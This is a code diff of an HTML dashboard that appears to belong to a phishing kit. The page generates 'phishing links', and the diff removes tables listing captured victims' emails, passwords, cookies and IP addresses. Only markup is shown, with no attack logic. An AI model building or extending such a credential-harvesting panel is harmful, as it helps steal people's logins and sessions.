@@ -5,7 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dashboard</title>
     <style>
-        /* Sidebar Menu */
+        body {
+            font-family: Arial, sans-serif;
+        }
         #menu {
             width: 200px;
             height: 100vh;
@@ -30,21 +32,9 @@
         #menu button:hover {
             background: #666;
         }
-        /* Content */
         #content {
             margin-left: 220px;
             padding: 20px;
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-        table, th, td {
-            border: 1px solid black;
-        }
-        th, td {
-            padding: 10px;
-            text-align: left;
         }
     </style>
 </head>
@@ -52,41 +42,13 @@
 
 <div id="menu">
     <button onclick="generateLink()">Generate Link</button>
-    <button onclick="fetchCapturedSessions()">Captured Sessions</button>
-    <button onclick="fetchGeneratedLinks()">Generated Links</button>
     <button onclick="logout()">Logout</button>
 </div>
 
 <div id="content">
     <h2>Dashboard</h2>
-    
     <h3>Generated Phishing Link</h3>
     <p id="generatedLink">Click "Generate Link" to create one.</p>
-
-    <h3>Captured Sessions</h3>
-    <table>
-        <thead>
-            <tr>
-                <th>Email</th>
-                <th>Password</th>
-                <th>Cookies</th>
-                <th>IP Address</th>
-            </tr>
-        </thead>
-        <tbody id="sessionsTableBody"></tbody>
-    </table>
-
-    <h3>Generated Links History</h3>
-    <table>
-        <thead>
-            <tr>
-                <th>Generated Link</th>
-                <th>Location</th>
-                <th>IP Address</th>
-            </tr>
-        </thead>
-        <tbody id="linksTableBody"></tbody>
-    </table>
 </div>
 
 <script src="script.js"></script>
